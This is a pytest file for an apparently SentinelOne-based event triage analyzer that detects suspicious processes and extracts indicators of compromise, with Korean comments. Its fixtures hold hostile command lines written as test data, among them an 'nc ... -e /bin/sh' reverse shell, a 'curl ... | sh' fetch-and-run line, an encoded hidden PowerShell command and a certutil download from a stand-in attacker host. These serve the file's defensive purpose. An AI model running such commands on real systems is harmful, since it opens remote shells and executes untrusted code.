from s1triage.analyzer import analyze_events, extract_iocs, normalize_domain, normalize_process_name


def test_normalize_process_name():
    assert normalize_process_name(r"C:\Windows\System32\WindowsPowerShell\v1.0\PowerShell.EXE") == "powershell"
    assert normalize_process_name("/usr/bin/nc") == "nc"
    assert normalize_process_name(None) == ""


def test_no_substring_false_positives():
    events = [
        {"tgtProcName": "sync.exe"},        # 'nc' 포함
        {"tgtProcName": "cmdagent.exe"},    # 'cmd' 포함
        {"tgtProcName": "OneDriveSync.exe"},
        {"tgtProcName": "vncviewer.exe"},
        {"tgtProcName": "winlogon.exe"},
    ]
    assert analyze_events(events).findings == []


def test_detects_lolbins_and_cmdline_patterns():
    events = [
        {"tgtProcName": "powershell.exe", "tgtProcCmdLine": "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi", "eventType": "Process Creation"},
        {"tgtProcName": "certutil.exe", "tgtProcCmdLine": "certutil -urlcache -split -f http://evil.example.com/a.exe a.exe"},
        {"tgtProcName": "nc", "tgtProcCmdLine": "nc 203.0.113.5 4444 -e /bin/sh"},
    ]
    r = analyze_events(events)
    cats = {f.category for f in r.findings}
    assert "인코딩된 PowerShell 명령" in cats
    assert "certutil 다운로드/디코딩" in cats
    assert "원격 접속 도구" in cats
    assert r.findings[0].weight >= r.findings[-1].weight  # 가중치 내림차순
    assert r.event_types["Process Creation"] == 1


def test_duplicate_findings_collapsed():
    e = {"tgtProcName": "cmd.exe", "tgtProcCmdLine": "cmd /c whoami"}
    assert len(analyze_events([e, dict(e), dict(e)]).findings) == 1


def test_extract_iocs_filters_private_and_validates():
    events = [
        {"dstIp": "8.8.8.8", "srcIp": "10.0.0.5"},
        {"dstIp": "192.168.1.1"},
        {"dnsRequest": "Evil.Example.COM."},
        {"networkUrl": "https://c2.bad.org:8443/path"},
        {"fileSha1": "A" * 40, "fileSha256": "b" * 64, "fileMd5": "not-a-hash"},
        {"tgtProcCmdLine": "curl http://198.51.100.7/x.sh | sh"},
    ]
    i = extract_iocs(events)
    assert i.ips == {"8.8.8.8"}  # 198.51.100.0/24 는 문서용 대역이라 제외
    assert i.domains == {"evil.example.com", "c2.bad.org"}
    assert i.sha1 == {"a" * 40}
    assert i.sha256 == {"b" * 64}
    assert i.md5 == set()


def test_normalize_domain():
    assert normalize_domain("localhost") is None
    assert normalize_domain("1.1.1.1") is None
    assert normalize_domain("sub.example.co.kr") == "sub.example.co.kr"
